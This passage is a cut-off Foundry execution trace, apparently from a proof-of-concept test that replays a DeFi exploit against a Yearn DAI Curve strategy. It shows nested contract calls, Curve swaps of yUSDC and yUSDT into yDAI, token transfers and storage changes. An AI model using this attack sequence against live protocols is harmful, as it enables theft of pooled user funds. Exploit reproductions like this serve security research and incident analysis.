+    │   │   │   │   │   ├─ [6496] 0x4DA9b813057D04BAef4e5800E36083717b4a0341::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   │   └─ ← [Return] 280671118812599902212786 [2.806e23]
+    │   │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x73a052500105205d34Daf004eAb301916DA8190f, 0), 0) [staticcall]
+    │   │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   ├─ [509] 0x49f4592E641820e928F9919Ef4aBd92a719B4b49::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 1239753704121538299 [1.239e18]
+    │   │   │   │   ├─ [7209] yDAI::transferFrom(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 33735016648822018942270 [3.373e22])
+    │   │   │   │   │   ├─ emit Transfer(from: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], to: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 33735016648822018942270 [3.373e22])
+    │   │   │   │   │   ├─ emit Approval(owner: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 0)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x2b326c195b4bf13398fccd87e6e23fac6ff3d9dc0e93a62080b304ab12378cdd: 0x00000000000000000000000000000000000000000000c40eadb7c086bae2ed45 → 0x00000000000000000000000000000000000000000000cb33751edad9f7fd1283
+    │   │   │   │   │   │   @ 0x1b938a68a762b4d2a2247e75bf0bc681feb38493ea74306b030bdeba90a79d62: 0x000000000000000000000000000000000000000000000724c7671a533d1a253e → 0
+    │   │   │   │   │   │   @ 0x2dec978f1642764f49d833e2986793af486810132175d9c3a93faedf68990245: 0x000000000000000000000000000000000000000000000724c7671a533d1a253e → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [11209] yUSDC::transferFrom(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 0)
+    │   │   │   │   │   ├─ emit Transfer(from: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], to: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 0)
+    │   │   │   │   │   ├─ emit Approval(owner: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [11187] yUSDT::transferFrom(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 0)
+    │   │   │   │   │   ├─ emit Transfer(from: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], to: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 0)
+    │   │   │   │   │   ├─ emit Approval(owner: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [11187] yTUSD::transferFrom(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 0)
+    │   │   │   │   │   ├─ emit Transfer(from: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], to: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 0)
+    │   │   │   │   │   ├─ emit Approval(owner: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [29606] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::mint(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], 361385569804083085766610 [3.613e23])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], value: 361385569804083085766610 [3.613e23])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 5: 0x00000000000000000000000000000000000000000013044f8cc590b217414b0f → 0x0000000000000000000000000000000000000000001350d64d06bab3302a3ae1
+    │   │   │   │   │   │   @ 0xdab847dbcb32312dc4e70af9ae199c77048db4ba6e3db2b21e7a575db2f4aadb: 0 → 0x000000000000000000000000000000000000000000004c86c0412a0118e8efd2
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit AddLiquidity(param0: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], param1: [33735016648822018942270 [3.373e22], 0, 0, 0], param2: [2557204816344752725 [2.557e18], 439, 251655201629998 [2.516e14], 4756338365094792 [4.756e15]], param3: 266320503524009886549682 [2.663e23], param4: 23351333044868169331260129 [2.335e25])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ad0: 0x000000000000000000000000000000000000000000000006820dafd3810c4630 → 0x000000000000000000000000000000000000000000000006820d3d62fb993299
+    │   │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace: 0x00000000000000000000000000000000000000000000c40eabf5125e127d71f8 → 0x00000000000000000000000000000000000000000000cb33619daa93a384c60c
+    │   │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ad1: 0x00000000000000000000000000000000000000000000007b00c6634d517b40c4 → 0x00000000000000000000000000000000000000000000007b00bdf05ea823d300
+    │   │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5acf: 0x000000000000000000000000000000000000000000000000000000000c7cf0cf → 0x000000000000000000000000000000000000000000000000000000000c7ceff4
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [736] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::balanceOf(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0]) [staticcall]
+    │   │   │   │   └─ ← [Return] 361385569804083085766610 [3.613e23]
+    │   │   │   ├─ [4638] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::approve(0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c, 0)
+    │   │   │   │   ├─ emit Approval(owner: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], spender: 0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c, value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [526] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::allowance(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], 0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [22538] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::approve(0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c, 361385569804083085766610 [3.613e23])
+    │   │   │   │   ├─ emit Approval(owner: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], spender: 0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c, value: 361385569804083085766610 [3.613e23])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xfd4dc3e524be33e7f1df391f6e45b2fb6db5e33d17bb9b7df3386b6280094dff: 0 → 0x000000000000000000000000000000000000000000004c86c0412a0118e8efd2
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [41243] 0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c::deposit(361385569804083085766610 [3.613e23])
+    │   │   │   │   ├─ [4844] 0x9E65Ad11b299CA0Abefc2799dDB6314Ef2d91080::balanceOf(0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8) [staticcall]
+    │   │   │   │   │   ├─ [3816] 0x07DB4B9b3951094B9E278D336aDf46a036295DE7::balanceOf() [staticcall]
+    │   │   │   │   │   │   ├─ [1665] 0x96Dd07B6c99b22F3f0cB1836aFF8530a98BDe9E3::balanceOf(0xFA712EE4788C042e2B7BB55E6cb8ec569C4530c1) [staticcall]
+    │   │   │   │   │   │   │   ├─ [805] 0xFA712EE4788C042e2B7BB55E6cb8ec569C4530c1::balanceOf(0xdc66DBa57c6f9213c641a8a216f8C3D9d83573cd) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [736] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::balanceOf(0x07DB4B9b3951094B9E278D336aDf46a036295DE7) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [736] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::balanceOf(0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2023382049364173638711357 [2.023e24]
+    │   │   │   │   ├─ [6127] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::transferFrom(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], 0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c, 361385569804083085766610 [3.613e23])
+    │   │   │   │   │   ├─ emit Transfer(from: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], to: 0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c, value: 361385569804083085766610 [3.613e23])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x8e36093343dbc2e4c97645883eb3b39d3bed4ba91924f22cedb1eef8cdf96cef: 0x00000000000000000000000000000000000000000001ac77c2bc372a5bf5b83d → 0x00000000000000000000000000000000000000000001f8fe82fd612b74dea80f
+    │   │   │   │   │   │   @ 0xfd4dc3e524be33e7f1df391f6e45b2fb6db5e33d17bb9b7df3386b6280094dff: 0x000000000000000000000000000000000000000000004c86c0412a0118e8efd2 → 0
+    │   │   │   │   │   │   @ 0xdab847dbcb32312dc4e70af9ae199c77048db4ba6e3db2b21e7a575db2f4aadb: 0x000000000000000000000000000000000000000000004c86c0412a0118e8efd2 → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], value: 308037696845876487865419 [3.08e23])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 2: 0x000000000000000000000000000000000000000000016d379cc86f0200b505ac → 0x00000000000000000000000000000000000000000001ae725e939aaafdea49f7
+    │   │   │   │   │   @ 0x2dec978f1642764f49d833e2986793af486810132175d9c3a93faedf68990245: 0 → 0x00000000000000000000000000000000000000000000413ac1cb2ba8fd35444b
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [952] yUSDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 41440665000 [4.144e10]
+    │   │   ├─ [233565] CurveFiSwap::exchange(1, 0, 41440665000 [4.144e10], 0)
+    │   │   │   ├─ [35413] yDAI::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1052943406217363306950338 [1.052e24]
+    │   │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1133752629097174055 [1.133e18]
+    │   │   │   ├─ [31906] yUSDC::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1315] CentreUSDC::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   ├─ [6496] 0x9bA00D6856a4eDF4665BcA2C2309936572473B7E::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   └─ ← [Return] 356118867834 [3.561e11]
+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0), 2) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101138810 [2.101e9], 815523096620 [8.155e11]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000f952a0
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1259083362487637320 [1.259e18]
+    │   │   │   ├─ [29076] yUSDT::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 40817840891 [4.081e10]
+    │   │   │   │   ├─ [803] 0x71fc860F7D3A592A4a98740e39dB31d25db65ae8::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0), 0) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [3780] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::delegateToImplementation(0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 7983010 [7.983e6]
+    │   │   │   ├─ [31690] yTUSD::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1185] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   ├─ [486] 0xB650eb28d35691dd1BD481325D40E65273844F9b::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   ├─ [6496] 0x4DA9b813057D04BAef4e5800E36083717b4a0341::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   └─ ← [Return] 280671118812599902212786 [2.806e23]
+    │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x73a052500105205d34Daf004eAb301916DA8190f, 0), 0) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x49f4592E641820e928F9919Ef4aBd92a719B4b49::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1239753704121538299 [1.239e18]
+    │   │   │   ├─ [7209] yUSDC::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 41440665000 [4.144e10])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 41440665000 [4.144e10])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 115792089237316195423570985008687907853269984665640564039457584007871688974935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000000000000009a60e5da8 → 0
+    │   │   │   │   │   @ 0x2b326c195b4bf13398fccd87e6e23fac6ff3d9dc0e93a62080b304ab12378cdd: 0x0000000000000000000000000000000000000000000000000000000010313aa7 → 0x00000000000000000000000000000000000000000000000000000009b63f984f
+    │   │   │   │   │   @ 0xd4323eae345c302632428595ef8598a8d956b13b06a6fc8511bc488b90519d29: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffff659f1a257
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [24048] yDAI::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 756645368869722470483727 [7.566e23])
+    │   │   │   │   ├─ emit Transfer(from: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 756645368869722470483727 [7.566e23])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x00000000000000000000000000000000000000000000a039d3dffc0917b4070f
+    │   │   │   │   │   @ 0x2b326c195b4bf13398fccd87e6e23fac6ff3d9dc0e93a62080b304ab12378cdd: 0x00000000000000000000000000000000000000000000cb33751edad9f7fd1283 → 0x000000000000000000000000000000000000000000002af9a13eded0e0490b74
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit TokenExchange(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 1, param2: 41440665000 [4.144e10], param3: 0, param4: 756645368869722470483727 [7.566e23])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5acf: 0x000000000000000000000000000000000000000000000000000000000c7ceff4 → 0x00000000000000000000000000000000000000000000000000000009b28b4d9b
+    │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace: 0x00000000000000000000000000000000000000000000cb33619daa93a384c60c → 0x000000000000000000000000000000000000000000002af158c9ac7e405ce686
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [886] yUSDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 4869389952115967126106 [4.869e21]
+    │   │   ├─ [199329] CurveFiSwap::exchange(2, 0, 4869389952115967126106 [4.869e21], 0)
+    │   │   │   ├─ [35413] yDAI::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1052943406217363306950338 [1.052e24]
+    │   │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
